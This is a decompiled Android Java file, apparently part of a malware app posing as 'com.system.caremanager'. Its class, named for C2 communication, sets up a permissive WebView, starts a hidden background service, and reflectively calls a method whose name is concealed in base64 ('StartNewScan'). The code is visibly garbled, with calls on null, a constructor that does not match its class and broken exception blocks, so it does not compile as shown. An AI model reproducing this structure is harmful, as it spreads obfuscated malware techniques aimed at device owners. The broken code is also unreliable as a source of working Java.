package com.system.caremanager;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class ServerCommunicator extends Activity {

     WebView mWebView;

    public C2CommunicationEngine() {
        return;
    }

    public void onBackPressed() {
        WebView mWebView = this.mWebView;
        boolean result = mWebView.canGoBack();
        if (result == null) {
            // branch: cond_0
        }
        WebView mWebView2 = this.mWebView;
        mWebView2.goBack();
        // continue loop -> :goto_0
        this.onBackPressed();
        return;
    }

    public void onCreate(Bundle param1) {
        try {
            this.onCreate(param1);
            int val = 2131165194;
            this.setContentView(val);
            int val2 = 2131034163;
            View result = this.findViewById(val2);
            result = (WebView) result;
            this.mWebView = result;
            WebSettings result2 = result.getSettings();
            result.setJavaScriptEnabled(1);
            WebView mWebView = this.mWebView;
            WebSettings result3 = mWebView.getSettings();
            result.setLoadWithOverviewMode(1);
            WebView mWebView2 = this.mWebView;
            WebSettings result4 = mWebView2.getSettings();
            result.setUseWideViewPort(1);
            WebView mWebView3 = this.mWebView;
            WebSettings result5 = mWebView3.getSettings();
            result.setAllowFileAccess(1);
            WebView mWebView4 = this.mWebView;
            WebSettings result6 = mWebView4.getSettings();
            result.setAppCacheEnabled(1);
            WebView mWebView5 = this.mWebView;
            WebSettings result7 = mWebView5.getSettings();
            result.setBuiltInZoomControls(null);
            WebView mWebView6 = this.mWebView;
            WebSettings result8 = mWebView6.getSettings();
            WebSettings.PluginState ON = WebSettings$PluginState.ON;
            result.setPluginState(ON);
            WebView mWebView7 = this.mWebView;
            WebSettings result9 = mWebView7.getSettings();
            String result10 = DataPackagingEngine.removeString(str, str2);
            String result11 = System.getProperty(result);
            result.setUserAgentString(result);
            WebView mWebView8 = this.mWebView;
            C2CommunicationEngine.1 c2CommunicationEngine.1 = new C2CommunicationEngine.1();
            mWebView8.setDownloadListener(c2CommunicationEngine.1);
            WebView mWebView9 = this.mWebView;
            WebViewClient webViewClient = new WebViewClient();
            mWebView9.setWebViewClient(webViewClient);
            WebView mWebView10 = this.mWebView;
            C2CommunicationEngine.MyChrome c2CommunicationEngine.MyChrome = new C2CommunicationEngine.MyChrome();
            mWebView10.setWebChromeClient(c2CommunicationEngine.MyChrome);
            WebView mWebView11 = this.mWebView;
            String str3 = "https://";
            mWebView11.loadUrl(str3);
            Context result12 = this.getApplicationContext();
            Class cls = MainBackgroundService.class;
            boolean result13 = BackgroundServiceHelper.removedqtractort40(MainBackgroundService.class, result);
            if (result == null) {
                // branch: cond_0
            }
            Intent intent = new Intent();
            Class cls2 = MainBackgroundService.class;
            String str4 = "com.system.caremanager.core";
            Class result14 = Class.forName(str4);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            Object result15 = null.newInstance();
            // continue loop -> :goto_2
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            // continue loop -> :goto_1
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            int val3 = 2;
            Class[] arr = new Class[val3];
            Class cls3 = Context.class;
            arr[null] = Context.class;
            Class cls4 = Intent.class;
            arr[1] = Intent.class;
            String str5 = "U3RhcnROZXdTY2Fu";
            String result16 = DataPackagingEngine.handleError(str5);
            Method result17 = null.getDeclaredMethod(result, arr);
            // continue loop -> :goto_3
            } catch (Exception e) {
                e.printStackTrace();
            null.printStackTrace();
            Object[] arr2 = new Object[val3];
            arr2[null] = result;
            arr2[1] = intent;
            Object result18 = result.invoke(null, arr2);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }

    protected void onRestoreInstanceState(Bundle param1) {
        this.onRestoreInstanceState(param1);
        WebView mWebView = this.mWebView;
        WebBackForwardList result = mWebView.restoreState(param1);
        return;
    }

    protected void onSaveInstanceState(Bundle param1) {
        this.onSaveInstanceState(param1);
        WebView mWebView = this.mWebView;
        WebBackForwardList result = mWebView.saveState(param1);
        return;
    }

}